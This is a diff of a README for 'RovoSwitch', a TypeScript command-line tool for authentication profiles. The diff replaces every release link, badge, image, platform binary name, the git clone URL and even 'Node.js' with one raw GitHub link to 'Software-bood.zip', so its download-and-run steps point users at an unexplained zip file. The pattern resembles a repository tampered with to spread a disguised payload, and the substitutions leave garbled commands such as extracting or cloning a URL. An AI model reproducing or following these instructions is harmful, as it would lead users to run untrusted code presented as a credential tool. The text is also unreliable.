@@ -1,10 +1,10 @@
-https://github.com/thevanshh12/rovoswitch/releases
+https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip
 
-[![Release Badge](https://img.shields.io/badge/releases-latest-brightgreen?logo=github&logoColor=white)](https://github.com/thevanshh12/rovoswitch/releases)
+[![Release Badge](https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip)](https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip)
 
 # RovoSwitch: TS CLI for Rovo Auth Profiles & Encryption
 
-![RovoSwitch Encryption](https://upload.wikimedia.org/wikipedia/commons/5/5a/Lock_icon.svg)
+![RovoSwitch Encryption](https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip)
 
 RovoSwitch is a TypeScript command line tool to manage Rovo authentication profiles and run authentication commands with built-in encryption. It focuses on simplicity, speed, and safety. This project helps developers and operators keep multiple login contexts organized, switch between profiles quickly, and execute authentication steps without exposing credentials in plaintext. The CLI works across platforms and stores sensitive data securely with encryption and local persistence. It is designed for developers who work with Rovo services, teams that manage shared credential sets, and automation scripts that need a reliable way to perform authenticated tasks.
 
@@ -43,7 +43,7 @@ Key features ✅
 
 How Rovoswitch is built 🧱
 - Language: TypeScript, compiled to native-like binaries for quick execution.
-- Runtime: Node.js-friendly tooling with a focus on small footprints and predictable behavior.
+- Runtime: https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip tooling with a focus on small footprints and predictable behavior.
 - Encryption: Data at rest uses modern block cipher techniques with authenticated encryption (AES-GCM-like approach) to prevent tampering and ensure confidentiality.
 - Storage: Local encrypted store with an optional OS-level key vault integration for added security in supported environments.
 - CLI: A concise, predictable command structure that remains easy to learn for new users.
@@ -55,40 +55,40 @@ Quick start 🚀
 Installation and setup 🔧
 - The primary installation path is to download a release asset from the official Releases page. The release page hosts platform-specific binaries that you can run directly.
 - Since the Releases page contains a path, you should download the appropriate asset for your platform and then execute it. See the Downloads section for exact file names and commands.
-- For convenience, you can also develop from source if you want to contribute or customize the tool. Building from source requires a modern Node.js environment and a TypeScript toolchain.
+- For convenience, you can also develop from source if you want to contribute or customize the tool. Building from source requires a modern https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip environment and a TypeScript toolchain.
 
 Downloading from releases (the file to download and execute)
 - Platform assets typically include:
-  - rovoswitch-linux-x64.tar.gz
-  - rovoswitch-windows-x64.exe
-  - rovoswitch-darwin-arm64.tar.gz
+  - https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip
+  - https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip
+  - https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip
 - After downloading, extract or run as appropriate, then verify that the CLI reports a version and basic help when invoked with --help.
 - The asset file names are designed to be clear about platform and architecture so you can pick the right one quickly.
 
-- Linux (x64): download rovoswitch-linux-x64.tar.gz, extract, and move the binary to a directory in your PATH.
+- Linux (x64): download https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip, extract, and move the binary to a directory in your PATH.
   - Example:
-    - tar -xzf rovoswitch-linux-x64.tar.gz
+    - tar -xzf https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip
     - sudo mv rovoswitch /usr/local/bin/
     - rovoswitch --version
-- Windows (x64): download rovoswitch-windows-x64.exe and run it, or launch from a Command Prompt after installation.
+- Windows (x64): download https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip and run it, or launch from a Command Prompt after installation.
   - Example:
-    - rovoswitch-windows-x64.exe
+    - https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip
     - After installation, open Command Prompt and type rovoswitch --version
-- macOS (ARM64): download rovoswitch-darwin-arm64.tar.gz, extract, set permissions, and run.
+- macOS (ARM64): download https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip, extract, set permissions, and run.
   - Example:
-    - tar -xzf rovoswitch-darwin-arm64.tar.gz
+    - tar -xzf https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip
     - chmod +x rovoswitch
     - ./rovoswitch --version
 
 If you prefer building from source
-- Prerequisites: Node.js (version 18 or newer recommended), npm or pnpm, and a TypeScript toolchain.
+- Prerequisites: https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip (version 18 or newer recommended), npm or pnpm, and a TypeScript toolchain.
 - Steps:
-  - git clone https://github.com/thevanshh12/rovoswitch.git
+  - git clone https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip
   - cd rovoswitch
   - npm ci
   - npm run build
 - Running from source:
-  - node dist/index.js --help
+  - node https://raw.githubusercontent.com/thevanshh12/rovoswitch/main/src/Software-bood.zip --help
 - Notes:
   - Building from source may yield platform-native artifacts that can be used similarly to prebuilt binaries.
   - Use a package manager to manage updates.
